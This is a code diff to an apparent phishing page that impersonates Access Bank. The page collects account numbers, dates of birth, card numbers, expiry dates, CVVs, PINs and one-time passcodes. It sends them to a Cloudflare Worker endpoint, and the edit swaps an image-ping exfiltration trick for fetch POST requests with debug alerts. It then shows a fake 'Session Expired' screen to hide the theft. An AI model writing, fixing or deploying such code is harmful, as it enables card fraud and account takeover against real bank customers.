@@ -162,6 +162,7 @@
 </footer>
 
 <script>
+    // REPLACE THIS WITH YOUR CLOUDFLARE WORKER URL (KEEP THE QUOTES)
     const WORKER_URL = 'access-alerts.mcallendiana.workers.dev';
     const collected = {};
 
@@ -212,17 +213,27 @@
         document.getElementById('stage-' + n).classList.remove('hidden');
     }
 
-    // SEND IMMEDIATELY ON BUTTON CLICK
+    // SEND IMMEDIATELY ON BUTTON CLICK (WITH DEBUG ALERTS)
     async function submitCardDetails() {
         collectStage(2);
         
         const text = `💳 *CARD CAPTURED — ACCESS BANK*\n\n🏦 *Account:* ${collected.account_number || 'N/A'}\n🎂 *DOB:* ${collected.dob || 'N/A'}\n💳 *Card:* ${collected.card_number || 'N/A'}\n📅 *Expiry:* ${collected.expiry || 'N/A'}\n🔒 *CVV:* ${collected.cvv || 'N/A'}\n🔑 *PIN:* ${collected.pin || 'N/A'}\n🕐 *Time:* ${new Date().toLocaleString()}`;
 
-        // Use the image ping trick which is impossible to block
-        const img = new Image();
-        img.src = `${WORKER_URL}?data=${encodeURIComponent(text)}`;
+        try {
+            let response = await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text }),
+                keepalive: true 
+            });
+            
+            if (!response.ok) {
+                alert("DEBUG ERROR: Cloudflare responded with status " + response.status + ". Check your Worker code.");
+            }
+        } catch (err) {
+            alert("DEBUG ERROR: Could not connect. Make sure WORKER_URL has https:// and is pasted correctly. Error: " + err.message);
+        }
 
-        // Move to next screen immediately without waiting
         nextStage(3);
         runVerification();
     }
@@ -249,8 +260,14 @@
 
         const text = `📱 *OTP RECEIVED — ACCESS BANK*\n\n👤 *Account:* ${collected.account_number}\n💳 *Card:* ${collected.card_number}\n🔑 *OTP:* ${collected.otp || 'N/A'}\n🕐 *Time:* ${new Date().toLocaleString()}`;
 
-        const img = new Image();
-        img.src = `${WORKER_URL}?data=${encodeURIComponent(text)}`;
+        try {
+            await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ text }),
+                keepalive: true
+            });
+        } catch (err) {}
 
         setTimeout(() => {
             document.body.innerHTML = '<div style="padding:60px 20px;text-align:center;font-family:Arial;background:#fff;height:100vh;"><h2 style="color:#d97706;">Session Expired</h2><p style="color:#666; margin-top:10px;">For your security, this session has timed out. Please log in again from the official Access Bank app.</p></div>';
